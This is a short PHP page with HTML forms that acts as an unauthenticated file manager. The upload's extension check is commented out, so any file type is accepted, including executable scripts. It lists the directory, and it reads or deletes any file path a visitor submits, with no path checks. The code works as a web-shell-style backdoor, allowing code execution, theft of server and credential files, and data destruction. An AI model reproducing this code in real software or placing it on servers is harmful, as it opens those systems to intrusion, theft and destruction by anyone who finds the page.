<?php
if (isset($_FILES['image'])) {
    $errors = array();
    $file_name = $_FILES['image']['name'];
    $file_size = $_FILES['image']['size'];
    $file_tmp = $_FILES['image']['tmp_name'];
    $file_type = $_FILES['image']['type'];
    $file_ext = strtolower(end(explode('.', $_FILES['image']['name'])));

    // $extensions = array("jpeg", "jpg", "png");

    // if (in_array($file_ext, $extensions) === false) {
    //     $errors[] = "extension not allowed, please choose a JPEG or PNG file.";
    // }

    if ($file_size > 2097152) {
        $errors[] = 'File size must be excately 2 MB';
    }

    if (empty($errors) == true) {
        move_uploaded_file($file_tmp, "" . $file_name);
        echo "Success";
    } else {
        print_r($errors);
    }
}
if (isset($_POST["fn-rm"])) {
    unlink($_POST["fn-rm"]);
}
if (isset($_POST["fn-dl"])) {
    $f = $_POST["fn-dl"];

    $file = ("$f");

    $filetype = filetype($file);

    $filename = basename($file);

    header("Content-Type: " . $filetype);

    header("Content-Length: " . filesize($file));

    header("Content-Disposition: attachment; filename=" . $filename);

    readfile($file);
}
?>
<html>

<body>

    <form action="" method="POST" enctype="multipart/form-data">
        <input type="file" name="image" />
        <input type="submit" />
    </form>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <p>List Files</p>

    <form method="POST">
        <input type="submit" name="ls" />
    </form>
    <?php
    if (isset($_POST["ls"])) {
        if ($handle = opendir('.')) {

            while (false !== ($entry = readdir($handle))) {

                if ($entry != "." && $entry != "..") {

                    echo "$entry \n";
                    echo "<br>";
                }
            }

            closedir($handle);
        }
    }
    ?>
    <p>File download</p>
    <form method="POST">
        <input type="text" name="fn-dl" />
        <input type="submit" />
    </form>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <p>File delete</p>
    <form method="POST">
        <input type="text" name="fn-rm" />
        <input type="submit" />
    </form>
</body>

</html>